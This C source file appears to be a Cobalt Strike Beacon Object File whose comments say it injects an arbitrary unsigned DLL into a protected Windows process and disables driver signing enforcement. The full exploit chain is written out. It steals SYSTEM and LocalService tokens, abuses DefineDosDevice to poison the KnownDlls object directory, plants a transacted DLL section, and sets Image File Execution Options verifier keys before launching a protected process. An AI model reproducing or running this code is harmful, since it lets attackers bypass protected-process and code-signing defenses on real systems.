/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Injects a arbitrary unsigned DLL into a protected
 * process. Leverages a bug in DefineDosServices and
 * Application Verifiers to force the DLL to load.
 *
**/

D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
	if ( BeaconApi->BeaconIsAdmin( ) ) {
		if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion >= 6 ) {
			if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 3 || NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 0 ) {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "Does not support anything older than Windows 8.1" ) ) );
				return;
			};
		};

		INT			NamLen = 0;
		INT			DllLen = 0;
		ULONG			PidNum = 0;

		HANDLE			SysTok = NULL;
		HANDLE			LclTok = NULL;

		LPWSTR			DllNam = NULL;
		LPWSTR			LnkNam = NULL;
		LPWSTR			RegNam = NULL;
		LPVOID			DllBuf = NULL;

		LPWSTR			KwnPth = NULL;
		LPWSTR			LnkPth = NULL;
		LPWSTR			GblPth = NULL;
		LPWSTR			ObjPth = NULL;
		LPWSTR			DskPth = NULL;
		LPWSTR			RegPth = NULL;

		HANDLE			DirObj = NULL;
		HANDLE			LnkObj = NULL;
		HANDLE			LnkTwo = NULL;
		HANDLE			MgrPtr = NULL;
		HANDLE			FlePtr = NULL;
		HANDLE			SecPtr = NULL;
		HANDLE			DupUsr = NULL;

		PIMAGE_DOS_HEADER	DosHdr = NULL;
		PIMAGE_NT_HEADERS	NthHdr = NULL;
		PIMAGE_SECTION_HEADER	SecHdr = NULL;

		HKEY			RegKey = NULL;

		PVOID			NtlMod = NULL;
		PVOID			K32Mod = NULL;
		PVOID			AdvMod = NULL;

		API			ApiTbl;
		DATAP			Parser;
		STARTUPINFOW		StartW;
		UNICODE_STRING		UniOne;
		UNICODE_STRING		UniTwo;
		OBJECT_ATTRIBUTES	ObjAtt;
		PROCESS_INFORMATION	ProcIn;
		SECURITY_DESCRIPTOR	SecDes;

		RtlSecureZeroMemory( &ApiTbl, sizeof( ApiTbl ) );
		RtlSecureZeroMemory( &Parser, sizeof( Parser ) );
		RtlSecureZeroMemory( &StartW, sizeof( StartW ) );
		RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
		RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
		RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
		RtlSecureZeroMemory( &ProcIn, sizeof( ProcIn ) );
		RtlSecureZeroMemory( &SecDes, sizeof( SecDes ) );

		NtlMod = PebGetModule( H_LIB_NTDLL );
		K32Mod = PebGetModule( H_LIB_KERNEL32 );
		AdvMod = PebGetModule( H_LIB_ADVAPI32 );

		ApiTbl.InitializeSecurityDescriptor = PeGetFuncEat( AdvMod, H_API_INITIALIZESECURITYDESCRIPTOR );
		ApiTbl.RtlAnsiStringToUnicodeString = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESTRING );
		ApiTbl.NtCreateSymbolicLinkObject   = PeGetFuncEat( NtlMod, H_API_NTCREATESYMBOLICLINKOBJECT );
		ApiTbl.RtlAnsiStringToUnicodeSize   = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESIZE );
		ApiTbl.SetSecurityDescriptorDacl    = PeGetFuncEat( AdvMod, H_API_SETSECURITYDESCRIPTORDACL );
		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
		ApiTbl.SetKernelObjectSecurity      = PeGetFuncEat( AdvMod, H_API_SETKERNELOBJECTSECURITY );
		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
		ApiTbl.CreateProcessWithTokenW      = PeGetFuncEat( AdvMod, H_API_CREATEPROCESSWITHTOKENW );
		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
		ApiTbl.CreateFileTransactedW        = PeGetFuncEat( K32Mod, H_API_CREATEFILETRANSACTEDW );
		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
		ApiTbl.NtCreateTransaction          = PeGetFuncEat( NtlMod, H_API_NTCREATETRANSACTION );
		ApiTbl.NtOpenProcessToken           = PeGetFuncEat( NtlMod, H_API_NTOPENPROCESSTOKEN );
		ApiTbl.RtlInitAnsiString            = PeGetFuncEat( NtlMod, H_API_RTLINITANSISTRING );
		ApiTbl.IsTokenRestricted            = PeGetFuncEat( AdvMod, H_API_ISTOKENRESTRICTED );
		ApiTbl.NtGetNextProcess             = PeGetFuncEat( NtlMod, H_API_NTGETNEXTPROCESS );
		ApiTbl.DuplicateTokenEx             = PeGetFuncEat( AdvMod, H_API_DUPLICATETOKENEX );
		ApiTbl.DefineDosDeviceW             = PeGetFuncEat( K32Mod, H_API_DEFINEDOSDEVICEW );
		ApiTbl.RegCreateKeyExW              = PeGetFuncEat( AdvMod, H_API_REGCREATEKEYEXW );
		ApiTbl.NtCreateSection              = PeGetFuncEat( NtlMod, H_API_NTCREATESECTION );
		ApiTbl.RegSetValueExW               = PeGetFuncEat( AdvMod, H_API_REGSETVALUEEXW );
		ApiTbl.SetThreadToken               = PeGetFuncEat( AdvMod, H_API_SETTHREADTOKEN );
		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
		ApiTbl.WriteFile                    = PeGetFuncEat( K32Mod, H_API_WRITEFILE );
		ApiTbl.LocalFree                    = PeGetFuncEat( K32Mod, H_API_LOCALFREE );
		ApiTbl.NtClose                      = PeGetFuncEat( NtlMod, H_API_NTCLOSE );
		ApiTbl.Sleep                        = PeGetFuncEat( K32Mod, H_API_SLEEP );

		BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
		DllNam = BeaconApi->BeaconDataExtract( &Parser, &NamLen );
		LnkNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
		RegNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
		DllBuf = BeaconApi->BeaconDataExtract( &Parser, &DllLen );
		PidNum = BeaconApi->BeaconDataInt( &Parser );

		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), DllNam );
		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), LnkNam );
		GblPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "GLOBALROOT\\KnownDlls\\%ls\0" ) ), DllNam );
		ObjPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\KernelObjects\\%ls\0" ) ), DllNam );
		DskPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "C:\\Windows\\System32\\%ls\0" ) ), DllNam );
		RegPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls\0" ) ), RegNam );

		SysTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-18" ) ), 0x16 );
		LclTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-19" ) ), 0x00 );

		if ( SysTok != NULL && LclTok != NULL ) {
			if ( ApiTbl.SetThreadToken( NULL, SysTok ) ) {
				RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
				RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );

				ApiTbl.RtlInitUnicodeString( &UniOne, C_PTR( G_SYM( L"\\GLOBAL??\\KnownDlls" ) ) );
				InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );

				if ( !( ApiTbl.NtCreateDirectoryObjectEx( &DirObj, STANDARD_RIGHTS_REQUIRED | 0xF, &ObjAtt, NULL, 0 ) >= 0 ) ) {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create the object directory." ) ) );
					goto Leave;
				};

				RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
				RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
				RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );

				ApiTbl.RtlInitUnicodeString( &UniOne, KwnPth );
				ApiTbl.RtlInitUnicodeString( &UniTwo, LnkPth );
				InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );

				if ( !( ApiTbl.NtCreateSymbolicLinkObject( &LnkObj, STANDARD_RIGHTS_REQUIRED | 0x1, &ObjAtt, &UniTwo ) >= 0 ) ) {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create symbolic link." ) ) );
					goto Leave;
				};

				RtlSecureZeroMemory( &SecDes, sizeof( SecDes ) );

				if ( ! ApiTbl.InitializeSecurityDescriptor( &SecDes, SECURITY_DESCRIPTOR_REVISION ) ) {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a security descriptor." ) ) );
					goto Leave;
				};

				if ( ! ApiTbl.SetSecurityDescriptorDacl( &SecDes, TRUE, NULL, FALSE ) ) {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not set the dacl on security descriptor." ) ) );
					goto Leave;
				};

				if ( ! ApiTbl.SetKernelObjectSecurity( LnkObj, DACL_SECURITY_INFORMATION, &SecDes ) ) {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not set the dacl on the link object." ) ) );
					goto Leave;
				};

				if ( ApiTbl.SetThreadToken( NULL, LclTok ) ) {
					RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
					RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
					RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );

					ApiTbl.RtlInitUnicodeString( &UniOne, C_PTR( G_SYM( L"\\??\\GLOBALROOT" ) ) );
					ApiTbl.RtlInitUnicodeString( &UniTwo, C_PTR( G_SYM( L"\\GLOBAL??" ) ) );
					InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );

					if ( !( ApiTbl.NtCreateSymbolicLinkObject( &LnkTwo, STANDARD_RIGHTS_REQUIRED | 0x1, &ObjAtt, &UniTwo ) >= 0 ) ) {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create symbolic link object." ) ) );
						goto Leave;
					};

					if ( ! ApiTbl.DefineDosDeviceW( DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, GblPth, ObjPth ) ) {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not define a dos device." ) ) );
						goto Leave;
					};

					if ( ApiTbl.SetThreadToken( NULL, SysTok ) ) {
						RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
						InitializeObjectAttributes( &ObjAtt, NULL, 0, NULL, NULL );

						if ( !( ApiTbl.NtCreateTransaction( &MgrPtr, TRANSACTION_ALL_ACCESS, &ObjAtt, NULL, NULL, 0, 0, 0, NULL, NULL ) >= 0 ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a transaction." ) ) );
							goto Leave;
						};

						if ( ( FlePtr = ApiTbl.CreateFileTransactedW( 
										DskPth, 
										GENERIC_READ | GENERIC_WRITE, 
										0, 
										NULL, 
										CREATE_ALWAYS, 
										0, 
										NULL, 
										MgrPtr, 
										NULL, 
										NULL ) 
						) == INVALID_HANDLE_VALUE ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create transacted file." ) ) );
							goto Leave;
						};

						DosHdr = C_PTR( DllBuf );
						if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "payload lacks a dos signature." ) ) );
							goto Leave;
						};
						NthHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
						NthHdr->FileHeader.NumberOfSymbols      = ( ULONG )( PidNum );
						NthHdr->FileHeader.TimeDateStamp        = ( ULONG )( NtCurrentTeb()->ClientId.UniqueProcess );
						NthHdr->FileHeader.PointerToSymbolTable = ( ULONG )( NtCurrentTeb()->ClientId.UniqueThread );

						if ( ! ApiTbl.WriteFile( FlePtr, DllBuf, DllLen, &( DWORD ){ 0x0 }, NULL ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to transacted file." ) ) );
							goto Leave;
						};

						RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
						RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );

						ApiTbl.RtlInitUnicodeString( &UniOne, ObjPth );
						InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );

						if ( !( ApiTbl.NtCreateSection( &SecPtr, SECTION_ALL_ACCESS, &ObjAtt, NULL, PAGE_READONLY, SEC_IMAGE, FlePtr ) >= 0 ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a section." ) ) );
							goto Leave;
						};

						if ( ApiTbl.RegCreateKeyExW( 
							HKEY_LOCAL_MACHINE, 
							RegPth, 
							0, 
							NULL, 
							REG_OPTION_VOLATILE, 
							KEY_ALL_ACCESS, 
							NULL, 
							&RegKey, 
							&( DWORD ){ 0 } ) != 0 
						) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create registry key." ) ) );
							goto Leave;
						};

						if ( ApiTbl.RegSetValueExW( RegKey, C_PTR( G_SYM( L"VerifierDlls" ) ), 0, REG_SZ, C_PTR( DllNam ), NamLen ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create verifier dll." ) ) );
							goto Leave;
						};

						if ( ApiTbl.RegSetValueExW( RegKey, C_PTR( G_SYM( L"GlobalFlag" ) ), 0, REG_DWORD, C_PTR( &( DWORD ){ 0x100 } ), sizeof( DWORD ) ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create global flag." ) ) );
							goto Leave;
						};

						if ( ! ApiTbl.DuplicateTokenEx( SysTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DupUsr ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not duplicate token." ) ) );
							goto Leave;
						};

						StartW.cb = sizeof( StartW );

						if ( ApiTbl.CreateProcessWithTokenW(
								DupUsr,
								0,
								NULL,
								RegNam,
								CREATE_PROTECTED_PROCESS,
								NULL,
								NULL,
								&StartW,
								&ProcIn
						) )
						{
							ApiTbl.Sleep( 5000 );
							ApiTbl.NtClose( ProcIn.hProcess );
							ApiTbl.NtClose( ProcIn.hThread );
						} else {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( ":(" ) ) );
							goto Leave;
						}
					} else {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate system." ) ) );
						goto Leave;
					};
				} else {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate local system." ) ) );
					goto Leave;
				};
			} else {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate system." ) ) );
				goto Leave;
			};
		} else {
			BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get tokens needed." ) ) );
			goto Leave;
		};
Leave:
		if ( SysTok != NULL ) {
			ApiTbl.NtClose( SysTok );
		};
		if ( LclTok != NULL ) {
			ApiTbl.NtClose( LclTok );
		};
		if ( DirObj != NULL ) {
			ApiTbl.NtClose( DirObj );
		};
		if ( LnkObj != NULL ) {
			ApiTbl.NtClose( LnkObj );
		};
		if ( LnkTwo != NULL ) {
			ApiTbl.NtClose( LnkTwo );
		};
		if ( MgrPtr != NULL ) {
			ApiTbl.NtClose( MgrPtr );
		};
		if ( FlePtr != NULL ) {
			ApiTbl.NtClose( FlePtr );
		};
		if ( SecPtr != NULL ) {
			ApiTbl.NtClose( SecPtr );
		};
		if ( RegKey != NULL ) {
			/* RegCloseKey */
		};
		if ( DupUsr != NULL ) {
			ApiTbl.NtClose( DupUsr );
		};
		if ( KwnPth != NULL ) {
			ApiTbl.LocalFree( KwnPth );
		};
		if ( LnkPth != NULL ) {
			ApiTbl.LocalFree( LnkPth );
		};
		if ( GblPth != NULL ) {
			ApiTbl.LocalFree( GblPth );
		};
		if ( ObjPth != NULL ) {
			ApiTbl.LocalFree( ObjPth );
		};
		if ( DskPth != NULL ) {
			ApiTbl.LocalFree( DskPth );
		};
		if ( RegPth != NULL ) {
			ApiTbl.LocalFree( RegPth );
		};
	} else { 
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "beacon is not running as an administrative user." ) ) );
	};
};
